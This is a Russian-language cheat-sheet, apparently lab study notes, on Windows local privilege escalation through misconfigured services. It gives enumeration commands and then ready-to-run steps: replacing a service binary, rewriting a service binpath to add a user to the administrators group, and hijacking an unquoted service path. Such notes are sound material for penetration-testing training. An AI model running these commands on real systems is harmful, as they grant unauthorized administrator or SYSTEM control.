#windows #AD #lpe #acl 

# Проверка прав доступа 

1) Winpeass.ps1
2) SharpUp
```powershell
.\SharpUp.exe audit
```
3) icacls
```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
4) accesschk.exe
```powershell
accesschk.exe /accepteula -quvcw SERVICENAME
```
# Способы эскалация

### 1) Замена двоичного файла службы

Генерируем полезную нагрузку, затем подставляем 
```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

sc start SecurityService
```

### 2) Изменение пути к исполняемому файлу службы

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

sc stop WindscribeService

sc start WindscribeService
```
Исполняемый файл будет запущен, когда система попытается запустить службу, прежде чем выдаст ошибку и снова остановит службу, выполнив любую команду, которую мы укажем в параметре `binpath`

### 3) Unquoted  path (путь к файлу без кавычек)

Путь к исполняемому файлу службы
```cmd
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

<span style="background:#b1ffff">Windows определяет способ выполнения программы на основе расширения файла, поэтому указывать его не обязательно. При запуске службы Windows попытается загрузить следующие потенциальные исполняемые файлы в указанном порядке, при этом подразумевается файл с расширением .exe:</span>

<font color="#8064a2">- `C:\Program`</font>
<font color="#8064a2">- `C:\Program Files`</font>
<font color="#8064a2">- `C:\Program Files (x86)\System`</font>
<font color="#8064a2">- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`</font>

<span style="background:#ff4d4f">Если мы сможем создать следующие файлы, мы сможем перехватить управление исполняемым файлом службы и получить доступ к выполнению команд в контексте этой службы, в данном случае: `NT AUTHORITY\SYSTEM`.</span>

<font color="#c00000">- `C:\Program.exe\`</font>
<font color="#c00000">- `C:\Program Files (x86)\System.exe`</font>

#### Поиск сервисов с UNQUOTED PATH
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

